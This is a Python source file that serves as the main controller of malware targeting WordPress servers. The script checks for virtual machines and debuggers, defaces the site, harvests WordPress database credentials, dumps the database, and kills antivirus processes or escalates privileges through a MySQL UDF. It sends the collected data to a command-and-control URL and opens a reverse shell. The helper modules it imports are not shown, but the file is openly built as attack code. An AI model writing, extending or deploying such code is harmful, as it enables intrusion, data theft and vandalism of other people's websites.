#!/usr/bin/python3
from concurrent.futures import ThreadPoolExecutor
from socket import gethostbyname, gethostname
import os
import logging, sys
from queue import Queue
from time import sleep

from modules.malware.check_process import check_parent, kill_avs, wait_parent
from modules.cookie_comm import communication_client_main, read_file
from modules.malware.execute import reverse_shell_main, is_root
from modules.malware.mysql import dump_wp_db, priv_esc_udf
from modules.malware.wordpress import get_wp_db_creds
from modules.malware.defacement import defacement
from modules.crypto import encrypt, decrypt
from modules.hash import hash

from modules.malware.evasion import is_vm, is_debugger

IP = "127.0.0.1"
PORT = "8080"
URL = f"http://{IP}:{PORT}/api"

if __name__ == '__main__':
    FORMAT = '[%(asctime)s] [%(funcName)-30s] [%(levelname)-8s] [%(message)s]'
    # #logging.basicConfig(filename='malware.log', encoding='utf-8', format=FORMAT, level=0)
    #logging.basicConfig(filename='malware.log', encoding='utf-8', format=FORMAT, level=0)
    #logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=0)

    exfiltrate = Queue()
    instructions = Queue()
    client_id = f"{gethostname()}-{gethostbyname(gethostname())}"
    user = os.popen('whoami').read().replace("\n","")
    id = os.popen('id').read().replace("\n","")

    status = check_parent()
    if not status:
        if is_debugger() or is_vm():    # Check if there is a debugger or a vm
            #print("is_debugger() or is_vm()")
            exfiltrate.put(f"[{user}] - [MAIN] In VM: TRUE")
            #sleep(60*12) # Sleep 12 min

    with ThreadPoolExecutor(max_workers=2) as executor:
        #logging.info("START MALWARE MAIN")
        #print("Start ...")
        executor.submit(communication_client_main, client_id, exfiltrate, instructions, encrypt, decrypt, 10, URL)
        if not status:
            exfiltrate.put(f"[{user}] - [MAIN] Parent - PID: {os.getpid()} ID: {id}")
            #print("Parent")
            defacement(exfiltrate, user)
            #sleep(5)
            db_creds = get_wp_db_creds(exfiltrate, user)
            if db_creds:
                #sleep(10)
                dump_wp_db(db_creds, exfiltrate, user)    
            if is_root():
                #exfiltrate.put(f"[{user}] - [MAIN] Is Root")
                #print("Is Root")
                kill_avs()
            else:
                #exfiltrate.put(f"[{user}] - [MAIN] Is not Root")
                #print("Is not Root")
                if db_creds:
                    #sleep(30)
                    priv_esc_udf(db_creds, exfiltrate, user)
            exfiltrate.put(f"[{user}] - [MAIN] Open Reverse Shell")
            exfiltrate.put('END')
        else:
            kill_avs()
            sleep(110)
            wait_parent()
            sleep(10)
            exfiltrate.put(f"[{user}] - [MAIN] Child - PID: {os.getpid()} ID: {id}")
            #print("Child")
            exfiltrate.put(f"[{user}] - [MAIN] Open Reverse Shell")
            exfiltrate.put('END') # flag to open shell 
        sleep(5)     
        executor.submit(reverse_shell_main, instructions, exfiltrate, 5)